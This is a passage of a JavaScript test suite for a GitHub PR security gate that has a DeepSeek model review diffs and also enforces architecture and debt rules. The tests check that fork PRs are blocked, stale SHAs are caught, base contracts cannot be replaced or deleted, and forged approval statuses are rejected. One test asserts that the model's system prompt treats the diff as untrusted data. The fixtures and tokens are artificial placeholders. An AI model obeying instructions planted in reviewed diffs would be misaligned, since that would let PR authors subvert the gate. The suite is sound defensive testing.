  });

  assert.equal(invalidAttempts, 2);
  assert.equal(stillInvalid.conclusion, 'BLOCK');
  assert.match(stillInvalid.diagnostic, /sensitiveSurfaces 必须是对象/);
});

test('DeepSeek 截断 JSON 时报告 finish_reason，而不是泛化成 JSON 解析错误', async () => {
  const dependencies = createWorkflowDependencies({
    event: {
      number: 1,
      pull_request: {
        base: { ref: 'main', sha: 'base1234' },
        head: { ref: 'feature/review', sha: 'head1234', repo: { fork: false } },
        merge_commit_sha: 'merge1234',
      },
    },
    env: {
      GITHUB_REPOSITORY: 'owner/repo',
      GITHUB_TOKEN: 'github-token',
      DEEPSEEK_API_KEY: 'deepseek-key',
    },
    fetchImpl: async () => new Response(JSON.stringify({
      choices: [{ message: { content: '{"conclusion":' }, finish_reason: 'length' }],
    })),
  });

  await assert.rejects(
    dependencies.callModel({ model: 'deepseek-v4-pro', prompt: '请输出合法 JSON。' }),
    /finish_reason=length/,
  );
});

test('fork PR 不读取 diff 也不调用模型', async () => {
  const result = await runReview({
    getPullRequest: async () => ({ ...baseContext, isFork: true, changedFiles: [] }),
    getDiff: async () => { throw new Error('不应读取 diff'); },
    readPolicy: async () => { throw new Error('不应读取规则'); },
    callModel: async () => { throw new Error('不应调用模型'); },
    upsertComment: async () => {},
  });

  assert.equal(result.conclusion, 'BLOCK');
  assert.match(result.markdown, /fork PR/);
});

test('安全门禁 PASS 但架构门禁 BLOCK 时最终仍阻断', () => {
  const security = validateReview(review());
  const historicalDebt = {
    level: 'P2',
    component: 'api',
    path: 'src/api/legacy.js',
    ruleId: 'legacy.logging',
    fingerprint: 'abc123',
    firstSeen: '2026-01-01',
  };
  const markdown = renderReport(baseContext, security, {
    configured: true,
    conclusion: 'BLOCK',
    summary: '候选合并态新增模块循环依赖。',
    newViolations: [{ ruleId: 'architecture.cycle', path: 'src/a', message: 'a -> b -> a' }],
    existingViolations: [],
    resolvedViolations: [],
    debt: {
      mode: 'ratchet',
      baseCount: 1,
      candidateCount: 1,
      baseCounts: { api: 1 },
      candidateCounts: { api: 1 },
      newItems: [],
      existingItems: [historicalDebt],
      resolvedItems: [],
      missingCurrentItems: [],
      mismatchedCurrentItems: [],
    },
  });

  assert.match(markdown, /安全门禁：PASS/);
  assert.match(markdown, /架构门禁：BLOCK/);
  assert.match(markdown, /判定结果：BLOCK/);
  assert.match(markdown, /基线 → 候选：1 → 1/);
  assert.match(markdown, /api：1 → 1/);
  assert.match(markdown, /首次出现=2026-01-01/);
});

test('SHA 漂移时不发布旧报告', async () => {
  let published = false;
  await assert.rejects(() => runReview({
    getPullRequest: async () => ({ ...baseContext, isFork: false, changedFiles: [] }),
    getDiff: async () => 'diff --git a/a.js b/a.js\n@@ -0,0 +1 @@\n+const ok = true;',
    readPolicy: async () => '# policy',
    callModel: async () => review(),
    ensureFreshContext: async () => { throw new Error('stale'); },
    upsertComment: async () => { published = true; },
  }));
  assert.equal(published, false);
});

test('merge_group 使用目标分支最新 SHA 审查组合态，并写入 job summary', async () => {
  const event = {
    action: 'checks_requested',
    merge_group: {
      base_ref: 'refs/heads/main',
      base_sha: 'queue-parent',
      head_ref: 'refs/heads/gh-readonly-queue/main/pr-2',
      head_sha: 'merge-group-sha',
    },
  };
  const calls = [];
  let summary = '';
  const fetchImpl = async (url, options = {}) => {
    calls.push({ url, options });
    if (url.endsWith('/git/ref/heads/main')) return new Response(JSON.stringify({ object: { sha: 'target-base' } }));
    if (url.endsWith('/git/ref/heads/gh-readonly-queue/main/pr-2')) return new Response(JSON.stringify({ object: { sha: 'merge-group-sha' } }));
    if (url.endsWith('/compare/target-base...merge-group-sha')) {
      if (options.headers?.accept === 'application/vnd.github.v3.diff') {
        return new Response('diff --git a/a.js b/a.js\n@@ -0,0 +1 @@\n+change');
      }
      return new Response(JSON.stringify({
        status: 'ahead',
        merge_base_commit: { sha: 'target-base' },
        files: [{ filename: 'a.js' }],
      }));
    }
    throw new Error(`未预期请求：${url}`);
  };
  const dependencies = createWorkflowDependencies({
    event,
    env: {
      GITHUB_REPOSITORY: 'owner/repo',
      GITHUB_TOKEN: 'github-token',
      GITHUB_ACTOR: 'queue-bot',
      GITHUB_STEP_SUMMARY: 'summary.md',
    },
    fetchImpl,
    appendFileImpl: async (_path, value) => { summary += value; },
  });

  const context = await dependencies.getPullRequest();
  const diff = await dependencies.getDiff();
  await dependencies.ensureFreshContext();
  await dependencies.upsertComment('组合态报告');

  assert.equal(context.eventType, 'merge_group');
  assert.equal(context.baseSha, 'target-base');
  assert.equal(context.queueBaseSha, 'queue-parent');
  assert.match(diff, /change/);
  assert.equal(summary, '组合态报告\n');
  assert.equal(calls.some(call => call.url.includes('/pulls/null') || call.url.includes('/issues/null')), false);
});

test('merge_group 候选不再包含目标 base 时必须失效', async () => {
  const event = {
    action: 'checks_requested',
    merge_group: {
      base_ref: 'refs/heads/main',
      base_sha: 'old-queue-parent',
      head_ref: 'refs/heads/gh-readonly-queue/main/pr-3',
      head_sha: 'stale-candidate',
    },
  };
  const fetchImpl = async url => {
    if (url.endsWith('/git/ref/heads/main')) return new Response(JSON.stringify({ object: { sha: 'new-target' } }));
    if (url.endsWith('/git/ref/heads/gh-readonly-queue/main/pr-3')) return new Response(JSON.stringify({ object: { sha: 'stale-candidate' } }));
    if (url.endsWith('/compare/new-target...stale-candidate')) {
      return new Response(JSON.stringify({
        status: 'diverged',
        merge_base_commit: { sha: 'old-target' },
        files: [{ filename: 'a.js' }],
      }));
    }
    throw new Error(`未预期请求：${url}`);
  };
  const dependencies = createWorkflowDependencies({
    event,
    env: { GITHUB_REPOSITORY: 'owner/repo', GITHUB_TOKEN: 'github-token' },
    fetchImpl,
  });

  await assert.rejects(() => dependencies.getDiff(), /不再基于已记录的目标 base/);
});

test('候选 PR 不能用自己新增的契约替代受保护 base 契约', async () => {
  const event = {
    number: 8,
    pull_request: {
      base: { ref: 'main', sha: 'base1234' },
      head: { ref: 'feature/bootstrap-contract', sha: 'head1234', repo: { fork: false } },
      merge_commit_sha: 'merge1234',
    },
  };
  const architecture = {
    version: 1,
    contractChangeCheck: 'architecture-owner-approval',
    components: [{ name: 'app', paths: ['src/**'], referenceMarkers: ['@app/'], allowedDependencies: [] }],
    resourceRules: [],
    criticalPaths: [],
    debtBudgets: { mode: 'ratchet', total: 0, components: { app: 0 } },
  };
  const encodeFile = value => new Response(JSON.stringify({
    type: 'file',
    encoding: 'base64',
    content: Buffer.from(JSON.stringify(value)).toString('base64'),
  }));
  const fetchImpl = async url => {
    if (url.endsWith('/contents/.pr-security-gate/architecture.json?ref=base1234')) {
      return new Response('', { status: 404 });
    }
    if (url.endsWith('/contents/.pr-security-gate/architecture.json?ref=merge1234')) {
      return encodeFile(architecture);
    }
    if (url.endsWith('/contents/.pr-security-gate/debt.json?ref=merge1234')) {
      return encodeFile({ version: 1, items: [] });
    }
    throw new Error(`未预期请求：${url}`);
  };
  const dependencies = createWorkflowDependencies({
    event,
    env: { GITHUB_REPOSITORY: 'owner/repo', GITHUB_TOKEN: 'github-token' },
    fetchImpl,
  });

  const inputs = await dependencies.getArchitectureInputs(review());
  const result = evaluateArchitectureGate(inputs);

  assert.equal(inputs.contract, null);
  assert.equal(result.configured, false);
  assert.equal(result.conclusion, 'BLOCK');
});

test('候选合并态不能删除受保护 base 上的架构契约', async () => {
  const event = {
    number: 8,
    pull_request: {
      base: { ref: 'main', sha: 'base1234' },
      head: { ref: 'feature/remove-contract', sha: 'head1234', repo: { fork: false } },
      merge_commit_sha: 'merge1234',
    },
  };
  const architecture = {
    version: 1,
    contractChangeCheck: 'architecture-owner-approval',
    components: [{ name: 'app', paths: ['src/**'], referenceMarkers: ['@app/'], allowedDependencies: [] }],
    resourceRules: [],
    criticalPaths: [],
    debtBudgets: { mode: 'ratchet', total: 0, components: { app: 0 } },
  };
  const fetchImpl = async url => {
    if (url.endsWith('/contents/.pr-security-gate/architecture.json?ref=base1234')) {
      return new Response(JSON.stringify({
        type: 'file',
        encoding: 'base64',
        content: Buffer.from(JSON.stringify(architecture)).toString('base64'),
      }));
    }
    if (url.endsWith('/contents/.pr-security-gate/architecture.json?ref=merge1234')) {
      return new Response('', { status: 404 });
    }
    throw new Error(`未预期请求：${url}`);
  };
  const dependencies = createWorkflowDependencies({
    event,
    env: { GITHUB_REPOSITORY: 'owner/repo', GITHUB_TOKEN: 'github-token' },
    fetchImpl,
  });

  await assert.rejects(
    () => dependencies.getArchitectureInputs(review()),
    /候选合并态缺少架构契约/,
  );
});

test('base 已配置时，候选架构契约仍必须是有效配置', async () => {
  const event = {
    number: 8,
    pull_request: {
      base: { ref: 'main', sha: 'base1234' },
      head: { ref: 'feature/contract', sha: 'head1234', repo: { fork: false } },
      merge_commit_sha: 'merge1234',
    },
  };
  const baseArchitecture = architectureContract();
  const fetchImpl = async url => {
    if (url.endsWith('/contents/.pr-security-gate/architecture.json?ref=base1234')) {
      return new Response(JSON.stringify({
        type: 'file',
        encoding: 'base64',
        content: Buffer.from(JSON.stringify(baseArchitecture)).toString('base64'),
      }));
    }
    if (url.endsWith('/contents/.pr-security-gate/architecture.json?ref=merge1234')) {
      return new Response(JSON.stringify({
        type: 'file',
        encoding: 'base64',
        content: Buffer.from('{"version":999}').toString('base64'),
      }));
    }
    throw new Error(`未预期请求：${url}`);
  };
  const dependencies = createWorkflowDependencies({
    event,
    env: { GITHUB_REPOSITORY: 'owner/repo', GITHUB_TOKEN: 'github-token' },
    fetchImpl,
  });

  await assert.rejects(
    () => dependencies.getArchitectureInputs(review()),
    /architecture contract version must be 1/,
  );
});

test('base 与候选合并态都必须提供有效债务账本', async () => {
  const event = {
    number: 8,
    pull_request: {
      base: { ref: 'main', sha: 'base1234' },
      head: { ref: 'feature/contract', sha: 'head1234', repo: { fork: false } },
      merge_commit_sha: 'merge1234',
    },
  };
  const architecture = architectureContract();
  const encodeFile = value => new Response(JSON.stringify({
    type: 'file',
    encoding: 'base64',
    content: Buffer.from(JSON.stringify(value)).toString('base64'),
  }));
  const fetchImpl = async url => {
    if (url.endsWith('/contents/.pr-security-gate/architecture.json?ref=base1234')) {
      return encodeFile(architecture);
    }
    if (url.endsWith('/contents/.pr-security-gate/architecture.json?ref=merge1234')) {
      return encodeFile(architecture);
    }
    if (url.endsWith('/contents/.pr-security-gate/debt.json?ref=base1234')) {
      return encodeFile({ version: 1, items: [] });
    }
    if (url.endsWith('/contents/.pr-security-gate/debt.json?ref=merge1234')) {
      return new Response('', { status: 404 });
    }
    throw new Error(`未预期请求：${url}`);
  };
  const dependencies = createWorkflowDependencies({
    event,
    env: { GITHUB_REPOSITORY: 'owner/repo', GITHUB_TOKEN: 'github-token' },
    fetchImpl,
  });

  await assert.rejects(
    () => dependencies.getArchitectureInputs(review()),
    /base 和候选合并态都必须包含/,
  );
});

test('架构快照跳过契约范围内的 PNG，并从固定 SHA 构建组合态', async () => {
  const event = {
    number: 9,
    pull_request: {
      base: { ref: 'main', sha: 'base1234' },
      head: { ref: 'feature/cycle', sha: 'head1234', repo: { fork: false } },
      merge_commit_sha: 'merge1234',
    },
  };
  const architecture = {
    version: 1,
    contractChangeCheck: 'architecture-owner-approval',
    components: [
      { name: 'a', paths: ['src/a/**'], referenceMarkers: ['@app/a/'], allowedDependencies: ['b'] },
      { name: 'b', paths: ['src/b/**'], referenceMarkers: ['@app/b/'], allowedDependencies: ['a'] },
    ],
    resourceRules: [],
    criticalPaths: [],
    debtBudgets: { mode: 'ratchet', total: 0, components: { a: 0, b: 0 } },
  };
  const debt = { version: 1, items: [] };
  const encodeFile = value => new Response(JSON.stringify({
    type: 'file',
    encoding: 'base64',
    content: Buffer.from(JSON.stringify(value)).toString('base64'),
  }));
  const blobCalls = [];
  const fetchImpl = async (url, options = {}) => {
    if (url.includes('/compare/base1234...merge1234')) {
      if (options.headers?.accept === 'application/vnd.github.v3.diff') {
        return new Response('diff --git a/src/b/b.js b/src/b/b.js\n@@ -0,0 +1 @@\n+import "@app/a/service"');
      }
      return new Response(JSON.stringify({
        status: 'ahead',
        merge_base_commit: { sha: 'base1234' },
        files: [{ filename: 'src/b/b.js' }],
      }));
    }
    if (url.includes('/contents/.pr-security-gate/architecture.json')) return encodeFile(architecture);
    if (url.includes('/contents/.pr-security-gate/debt.json')) return encodeFile(debt);
    if (url.endsWith('/git/trees/base1234?recursive=1')) {
      return new Response(JSON.stringify({
        truncated: false,
        tree: [
          { type: 'blob', path: 'src/a/a.js', sha: 'blob-a', size: 24 },
          { type: 'blob', path: 'src/a/assets/poster.png', sha: 'blob-png', size: 24 },
        ],
      }));
    }
    if (url.endsWith('/git/trees/merge1234?recursive=1')) {
      return new Response(JSON.stringify({
        truncated: false,
        tree: [
          { type: 'blob', path: 'src/a/a.js', sha: 'blob-a', size: 24 },
          { type: 'blob', path: 'src/b/b.js', sha: 'blob-b', size: 24 },
          { type: 'blob', path: 'src/a/assets/poster.png', sha: 'blob-png', size: 24 },
        ],
      }));
    }
    if (url.includes('/git/blobs/')) {
      const sha = url.split('/').at(-1);
      blobCalls.push(sha);
      const content = sha === 'blob-a'
        ? Buffer.from('import "@app/b/service"')
        : sha === 'blob-b'
          ? Buffer.from('import "@app/a/service"')
          : Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x01]);
      return new Response(JSON.stringify({ encoding: 'base64', content: content.toString('base64') }));
    }
    throw new Error(`未预期请求：${url} ${options.method ?? 'GET'}`);
  };
  const dependencies = createWorkflowDependencies({
    event,
    env: { GITHUB_REPOSITORY: 'owner/repo', GITHUB_TOKEN: 'github-token' },
    fetchImpl,
  });
  const context = await dependencies.getPullRequest();
  await dependencies.getDiff();
  context.changedFiles = ['src/b/b.js'];
  const inputs = await dependencies.getArchitectureInputs(review());
  const result = evaluateArchitectureGate(inputs);

  assert.equal(result.conclusion, 'BLOCK');
  assert.equal(result.newViolations.some(item => item.kind === 'cycle'), true);
  assert.equal(blobCalls.filter(sha => sha === 'blob-a').length, 1);
  assert.equal(blobCalls.filter(sha => sha === 'blob-png').length, 1);
});

test('同名 legacy status 不能伪造架构负责人审批', async () => {
  const event = {
    number: 10,
    pull_request: {
      base: { ref: 'main', sha: 'base1234' },
      head: { ref: 'feature/relax-contract', sha: 'head1234', repo: { fork: false } },
      merge_commit_sha: 'merge1234',
    },
  };
  const baseContract = {
    version: 1,
    contractChangeCheck: 'architecture-owner-approval',
    components: [{ name: 'app', paths: ['src/**'], referenceMarkers: ['@app/'], allowedDependencies: [] }],
    resourceRules: [],
    criticalPaths: [],
    debtBudgets: { mode: 'ratchet', total: 0, components: { app: 0 } },
  };
  const candidateContract = {
    ...baseContract,
    debtBudgets: { mode: 'ratchet', total: 1, components: { app: 1 } },
  };
  const debt = { version: 1, items: [] };
  const encodeFile = value => new Response(JSON.stringify({
    type: 'file',
    encoding: 'base64',
    content: Buffer.from(JSON.stringify(value)).toString('base64'),
  }));
  const fetchImpl = async url => {
    if (url.endsWith('/contents/.pr-security-gate/architecture.json?ref=base1234')) return encodeFile(baseContract);
    if (url.endsWith('/contents/.pr-security-gate/architecture.json?ref=merge1234')) return encodeFile(candidateContract);
    if (url.includes('/contents/.pr-security-gate/debt.json')) return encodeFile(debt);
    if (url.includes('/git/trees/')) return new Response(JSON.stringify({ truncated: false, tree: [] }));
    if (url.includes('/commits/merge1234/check-runs')) {
      return new Response(JSON.stringify({ total_count: 0, check_runs: [] }));
    }
    if (url.includes('/commits/head1234/check-runs')) {
      return new Response(JSON.stringify({ total_count: 0, check_runs: [] }));
    }
    if (url.includes('/commits/merge1234/status')) {
      return new Response(JSON.stringify({
        total_count: 1,
        statuses: [{
          context: 'architecture-owner-approval',
          state: 'success',
          sha: 'merge1234',
          target_url: 'https://example.com/forged',
          creator: { login: 'pull-request-author' },
        }],
      }));
    }
    throw new Error(`未预期请求：${url}`);
  };
  const dependencies = createWorkflowDependencies({
    event,
    env: {
      GITHUB_REPOSITORY: 'owner/repo',
      GITHUB_TOKEN: 'github-token',
      ARCHITECTURE_CHECK_WAIT_MS: '0',
    },
    fetchImpl,
  });

  const inputs = await dependencies.getArchitectureInputs(review());

  assert.deepEqual(inputs.passedChecks, []);
});

test('工作流依赖使用 GitHub API 和 DeepSeek，并更新已有报告评论', async () => {
  const event = {
    number: 8,
    pull_request: {
      title: '修复审查流程',
      base: { ref: 'main', sha: 'base1234' },
      head: { ref: 'feature/review', sha: 'abc1234', repo: { fork: false } },
      merge_commit_sha: 'merge1234',
      user: { login: 'li2233-max' },
    },
  };
  const calls = [];
  const fetchImpl = async (url, options = {}) => {
    calls.push({ url, options });
    if (url.endsWith('/compare/base1234...merge1234')) {
      if (options.headers?.accept === 'application/vnd.github.v3.diff') {
        return new Response('diff --git a/a.md b/a.md\n@@ -0,0 +1 @@\n+docs');
      }
      return new Response(JSON.stringify({
        status: 'ahead',
        merge_base_commit: { sha: 'base1234' },
        files: [{ filename: 'a.md' }],
      }));
    }
    if (url.endsWith('/issues/8/comments?per_page=100')) {
      return new Response(JSON.stringify([{ id: 11, body: '<!-- pr-security-gate-report -->\n旧报告' }]));
    }
    if (url.endsWith('/issues/comments/11')) {
      return new Response(JSON.stringify({ id: 11 }));
    }
    if (url === 'https://api.deepseek.com/chat/completions') {
      return new Response(JSON.stringify({ choices: [{ message: { content: JSON.stringify(review()) } }] }));
    }
    throw new Error(`未预期请求：${url}`);
  };
  const dependencies = createWorkflowDependencies({
    event,
    env: { GITHUB_REPOSITORY: 'li2233-max/requirement-solution-planner', GITHUB_TOKEN: 'github-token', DEEPSEEK_API_KEY: 'deepseek-key' },
    fetchImpl,
    readFileImpl: async () => '# PR 安全审查门禁',
    policyRoot: '/policy',
  });

  const raw = await dependencies.callModel({ model: 'deepseek-v4-pro', prompt: '审查 diff' });
  const diff = await dependencies.getDiff();
  await dependencies.upsertComment('<!-- pr-security-gate-report -->\n新报告');

  assert.equal(raw.conclusion, 'PASS');
  assert.match(diff, /diff --git/);
  const deepSeekCall = calls.find(call => call.url === 'https://api.deepseek.com/chat/completions');
  assert.equal(deepSeekCall.options.method, 'POST');
  assert.equal(deepSeekCall.options.headers.authorization, 'Bearer deepseek-key');
  const deepSeekBody = JSON.parse(deepSeekCall.options.body);
  assert.equal(deepSeekBody.model, 'deepseek-v4-pro');
  assert.equal(deepSeekBody.max_tokens, 16_384);
  assert.equal(deepSeekBody.messages[0].role, 'system');
  assert.match(deepSeekBody.messages[0].content, /不可信数据/);
  assert.deepEqual(deepSeekBody.messages[1], { role: 'user', content: '审查 diff' });
  const commentCall = calls.find(call => call.url.endsWith('/issues/comments/11'));
  assert.equal(commentCall.options.method, 'PATCH');
});

test('中心工作流默认从自身仓库根目录读取审查规则', async () => {
  const paths = [];
  const dependencies = createWorkflowDependencies({
    event: { number: 8, pull_request: { head: { ref: 'feature/review', sha: 'head1234', repo: { fork: false } }, base: { ref: 'main', sha: 'base1234' }, merge_commit_sha: 'merge1234' } },
    env: { GITHUB_REPOSITORY: 'li2233-max/requirement-solution-planner', GITHUB_TOKEN: 'github-token', DEEPSEEK_API_KEY: 'deepseek-key' },
    fetchImpl: async () => ({ ok: true, status: 200, text: async () => '', json: async () => ({}) }),
    readFileImpl: async path => {
      paths.push(path);
      return '# policy';
    },
  });

  await dependencies.readPolicy();

  assert.deepEqual(paths, [
    fileURLToPath(new URL('../../SKILL.md', import.meta.url)),
    fileURLToPath(new URL('../../references/review-output.md', import.meta.url)),
    fileURLToPath(new URL('../../references/evidence-requirements.md', import.meta.url)),
    fileURLToPath(new URL('../../references/architecture-contract.md', import.meta.url)),
  ]);
});

test('可复用工作流只读取中心仓库的固定规则，且不执行项目代码', async () => {
  const yaml = await readFile(new URL('../workflows/pr-ai-review.yml', import.meta.url), 'utf8');

  assert.match(yaml, /workflow_call:/);
  assert.match(yaml, /DEEPSEEK_API_KEY:/);
  assert.match(yaml, /repository: \$\{\{ job\.workflow_repository \}\}/);
  assert.match(yaml, /ref: \$\{\{ job\.workflow_sha \}\}/);
  assert.match(yaml, /persist-credentials: false/);
  assert.match(yaml, /checks: read/);
  assert.doesNotMatch(yaml, /github\.event\.pull_request\.head/);
  assert.doesNotMatch(yaml, /npm (ci|install)|pnpm install|yarn install/);
});

test('接入文档包含 pull_request、merge_group、Secret、中心工作流与必需检查配置', async () => {
  const setup = await readFile(new URL('../../docs/pr-ai-review-setup.md', import.meta.url), 'utf8');

  assert.match(setup, /DEEPSEEK_API_KEY/);
  assert.match(setup, /li2233-max\/pr-security-gate/);
  assert.match(setup, /@v4/);
  assert.match(setup, /Branch protection rules/);
  assert.match(setup, /pull_request/);
  assert.match(setup, /merge_group/);
  assert.match(setup, /标准入口/);
});
